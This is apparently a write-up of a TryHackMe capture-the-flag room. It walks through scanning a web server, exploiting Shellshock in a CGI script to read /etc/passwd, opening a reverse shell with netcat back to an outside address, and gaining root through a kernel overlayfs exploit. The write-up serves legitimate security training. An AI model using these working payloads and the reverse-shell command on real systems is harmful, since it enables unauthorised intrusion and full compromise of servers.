---
tags:
  - THM
  - Linux
  - Medium
  - ShellShock
  - RCE
  - Kernel
---
https://tryhackme.com/room/0day/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.64.147.239 0day.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC 0day.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Using `ffuf`, found the directory and file path `/cgi-bin/test.cgi` in the web server. So, detected possible **ShellShock attack**:
```console
$ nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi 0day.thm

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
```

# Exploitation
After intercepting the request and doing multiple tests, found that `User-Agent` is a vulnerable parameter:
```console
$ curl -s -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' 'http://0day.thm/cgi-bin/test.cgi'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

So, listen for connections:
```console
$ nc -lvnp 443
```

Get reverse shell:
```console
$ curl -s -H 'User-Agent: () { :; }; echo; /bin/busybox nc 192.168.150.216 443 -e /bin/sh' 'http://0day.thm/cgi-bin/test.cgi'
```

Get the **user flag**:
```console
$ cat /home/ryan/user.txt
```
# Post-Exploitation
The Linux Kernel is very outdated:
```console
$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

Transferred [this exploit](https://www.exploit-db.com/exploits/37292) as `ofs.c` to the target machine. Compilation fails but we solve it by specifying `cc1` file path: 
```console
$ gcc ofs.c -o ofs
gcc: error trying to exec 'cc1': execvp: No such file or directory

$ find / -name cc1 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1

$ export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.8:$PATH

$ gcc ofs.c -o ofs
```

Now we execute the exploit and get the **root flag**:
```console
$ chmod +x ./ofs

$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# cat /root/root.txt
```
